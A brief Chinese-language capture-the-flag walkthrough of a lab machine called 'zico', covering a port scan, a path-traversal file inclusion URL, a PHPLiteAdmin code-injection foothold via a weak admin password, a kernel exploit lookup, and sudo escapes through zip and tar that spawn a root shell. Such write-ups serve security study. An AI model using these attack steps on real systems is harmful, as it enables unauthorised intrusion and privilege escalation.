## port scan

```
# Nmap 7.94SVN scan initiated Sun Jan 19 04:43:38 2025 as: nmap -sT --min-rate=10000 -p- -oN port 192.168.56.139
Nmap scan report for 192.168.56.139 (192.168.56.139)
Host is up (0.021s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
46216/tcp open  unknown
```

## web

存在文件包含漏洞

```
http://192.168.56.139/view.php?page=../../../../../usr/databases/1.php
```

存在`PHPLiteAdmin 1.9.3 - Remote PHP Code Injection`

```
http://192.168.56.139/dbadmin/test_db.php
```

登陆密码弱口令`admin`

创建数据库后缀.php

![image-20250119185259322](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250119185259322.png)

![image-20250119185344470](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250119185344470.png)

创建字段，Default Value为一句话

![image-20250119185433104](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250119185433104.png)

## 提权

```
Linux zico 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```

内核提权

```
searchsploit linux kernel 3.2 -m 33589
```

**sudo提权（tar或zip）**

在zico家目录的wordpress目录找到wp-config.php

拿到数据库账号密码，发现是该用户密码`sWfCsfJSPV9H3AmQzw8`

```bash
zico@zico:~$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```

```shell
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

```shell
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

